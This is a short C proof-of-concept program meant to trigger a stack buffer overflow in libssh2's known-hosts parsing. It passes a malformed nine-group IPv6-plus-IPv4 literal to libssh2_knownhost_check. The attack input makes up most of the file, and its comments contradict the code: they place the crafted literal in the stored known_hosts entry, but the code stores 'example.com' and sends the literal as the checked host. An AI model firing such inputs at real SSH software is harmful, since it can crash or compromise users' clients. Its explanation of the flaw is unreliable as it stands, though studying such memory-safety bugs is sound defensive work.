/*
 * Known-hosts stack-buffer-overflow proof of concept.
 *
 * Simulates an attacker-controlled known_hosts entry being read in via the
 * public libssh2 known-hosts API, then checked against an unrelated host.
 * The crafted plain-text host literal below is not a valid IPv6 address (it
 * has 7 explicit hextets *and* a trailing embedded IPv4 group, i.e. 9 groups
 * total), but the library's loosened bound check accepts it anyway and
 * overflows a fixed-size stack array while converting it to its 128-bit
 * binary form.
 */
#include <libssh2.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_KNOWNHOSTS *hosts;
    int rc;

    static const char line[] =
        "example.com ssh-rsa "
        "AAAAB3NzaC1yc2EAAAADAQABAAAAgQDUJ1Q9Z3examplekeydataAAAAB3NzaC==\n";

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init() failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "libssh2_session_init() failed\n");
        return 1;
    }

    hosts = libssh2_knownhost_init(session);
    if(!hosts) {
        fprintf(stderr, "libssh2_knownhost_init() failed\n");
        return 1;
    }

    rc = libssh2_knownhost_readline(hosts, line, strlen(line),
                                    LIBSSH2_KNOWNHOST_FILE_OPENSSH);
    if(rc) {
        fprintf(stderr, "libssh2_knownhost_readline() failed: %d\n", rc);
        return 1;
    }

    /* Compare against an unrelated plain hostname. The stored entry above
       is parsed as a candidate IPv6 literal during the comparison, which is
       where the overflow happens. */
    rc = libssh2_knownhost_check(hosts, "1:2:3:4:5:6:7:1.2.3.4",
                                 "AAAAB3NzaC1yc2E=", 16,
                                 LIBSSH2_KNOWNHOST_TYPE_PLAIN |
                                 LIBSSH2_KNOWNHOST_KEYENC_BASE64,
                                 NULL);

    printf("knownhost_check rc=%d\n", rc);

    libssh2_knownhost_free(hosts);
    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
